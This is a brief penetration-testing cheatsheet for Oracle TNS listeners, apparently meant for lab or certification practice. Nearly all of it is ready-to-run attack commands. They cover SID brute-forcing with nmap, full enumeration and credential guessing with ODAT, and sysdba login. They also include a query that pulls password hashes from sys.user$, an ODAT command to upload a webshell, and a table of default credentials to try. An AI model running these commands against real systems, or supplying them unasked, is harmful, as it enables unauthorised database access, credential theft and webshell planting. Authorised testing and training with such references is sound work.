# Oracle TNS Cheatsheet

## Enumeration
| Command | Use |
|---------|-----|
| sudo nmap -p1521 -sV <IP> --open | Basic TNS scan |
| sudo nmap -p1521 -sV <IP> --script oracle-sid-brute | SID brute-force |
| ./odat.py all -s <IP> | Full enumeration + creds |

## Connection
| Command | Use |
|---------|-----|
| sqlplus user/pass@<IP>/SID | Normal login |
| sqlplus user/pass@<IP>/SID as sysdba | Sysdba login |

## Inside SQL Shell
| Command | Use |
|---------|-----|
| select table_name from all_tables; | List tables |
| select * from user_role_privs; | Check privileges |
| select name, password from sys.user$; | Extract hashes (sysdba needed) |

## File Upload (ODAT)
| Command | Use |
|---------|-----|
| ./odat.py utlfile -s <IP> -d <SID> -U user -P pass --sysdba --putFile <remote_path> <filename> <local_path> | Upload file/webshell |

## Default Creds to Try
| User | Pass |
|------|------|
| scott | tiger |
| dbsnmp | dbsnmp |
| system | (Oracle 9: CHANGE_ON_INSTALL) |

## Port
| Port | Service |
|------|---------|
| 1521 | Oracle TNS Listener |
